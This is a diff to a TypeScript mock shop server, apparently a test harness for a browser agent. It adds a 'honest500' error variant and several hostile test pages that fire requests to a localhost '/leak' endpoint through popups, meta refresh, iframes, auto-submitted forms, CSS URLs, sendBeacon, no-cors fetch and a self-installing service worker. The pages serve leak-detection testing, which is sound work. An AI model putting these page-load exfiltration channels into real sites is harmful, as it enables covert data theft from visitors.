@@ -13,8 +13,8 @@ export interface Variant {
   cookieBanner?: boolean;
   /** Submit button is permanently disabled (real defect: feature unusable). */
   disabledSubmit?: boolean;
-  /** "silent": server answers 500 but UI shows success. "wrongqty": server stores qty+1. */
-  bug?: "silent" | "wrongqty" | "dropped";
+  /** "silent": server answers 500 but UI shows success. "wrongqty": server stores qty+1. "honest500": server answers 500 and the UI says so (latency-to-verdict control). */
+  bug?: "silent" | "wrongqty" | "dropped" | "honest500";
   /** Server commits the order, then answers after `commitDelayMs` (response arrives too late). */
   commitDelayMs?: number;
   /** First POST /api/orders returns 503 without committing. */
@@ -237,6 +237,33 @@ export class ShopServer {
           `<!doctype html><title>WS</title><h1>WebSocket</h1><script>try{const w=new WebSocket("ws://localhost:${port}/ws");w.onerror=()=>{};}catch(e){}</script>`,
         );
       }
+      const evilPages: Record<string, (evil: string) => string> = {
+        "/x-popup": (e) => `<h1>Popup</h1><script>window.open("${e}?popup")</script>`,
+        "/x-meta": (e) => `<meta http-equiv="refresh" content="0;url=${e}?meta"><h1>Meta</h1>`,
+        "/x-iframe": (e) => `<h1>Frame</h1><iframe src="${e}?iframe"></iframe>`,
+        "/x-form": (e) =>
+          `<h1>Form</h1><form id="f" method="get" action="${e}"><input name="q" value="1"></form><script>document.getElementById("f").submit()</script>`,
+        "/x-css": (e) => `<h1>Css</h1><style>body{background:url(${e}?css)}</style>`,
+        "/x-beacon": (e) =>
+          `<h1>Beacon</h1><script>navigator.sendBeacon("${e}?beacon","x");fetch("${e}?cors",{mode:"no-cors"}).catch(()=>{})</script>`,
+        "/x-sw": (e) =>
+          `<h1>SW</h1><script>navigator.serviceWorker.register("/x-sw.js?e=${encodeURIComponent(e)}").catch(()=>{})</script>`,
+      };
+      if (req.method === "GET" && evilPages[u.pathname]) {
+        const port = (this.server!.address() as AddressInfo).port;
+        return send(
+          200,
+          `<!doctype html><title>x</title>${evilPages[u.pathname]!(`http://localhost:${port}/leak`)}`,
+        );
+      }
+      if (req.method === "GET" && u.pathname === "/x-sw.js") {
+        const e = u.searchParams.get("e") ?? "";
+        return send(
+          200,
+          `self.addEventListener("install",()=>{fetch(${JSON.stringify(e + "?sw")}).catch(()=>{})});self.addEventListener("activate",e=>e.waitUntil(self.clients.claim()))`,
+          "text/javascript",
+        );
+      }
       if (req.method === "GET" && u.pathname === "/hostile") {
         return send(
           200,
@@ -287,7 +314,7 @@ export class ShopServer {
           if (v.transient503 && this.state.postCount === 1) {
             return send(503, JSON.stringify({ error: "unavailable" }), "application/json");
           }
-          if (v.bug === "silent")
+          if (v.bug === "silent" || v.bug === "honest500")
             return send(500, JSON.stringify({ error: "boom" }), "application/json");
           const qty = v.bug === "wrongqty" ? body.qty + 1 : body.qty;
           const order: Order = { id: this.nextId++, name: body.name, qty, product: body.product };
